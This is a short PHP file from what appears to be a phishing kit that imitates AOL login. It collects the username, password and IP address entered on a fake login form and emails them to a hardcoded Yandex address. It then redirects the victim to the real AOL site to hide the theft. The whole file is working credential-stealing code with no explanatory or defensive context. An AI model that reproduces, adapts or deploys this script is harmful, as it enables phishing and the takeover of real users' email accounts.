<?

$ip = getenv("REMOTE_ADDR");
$message .= "--Coded by vikky_banti----\n";
$message .= "Username or Email : ".$_POST['loginId']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "--------------------\n";
$message .= "IP: ".$ip."\n";
$message .= "----Coded by Vikky_banti----------------\n";



$recipient = "pensoh0147@yandex.com";
$subject = "AOL R3SuLt";
$headers = "From: AOL";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "AOL", $message);
if (mail($recipient,$subject,$message,$headers))

{
?>
	
		   <script language=javascript>
window.location='http://www.aol.com';
</script>
<?

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>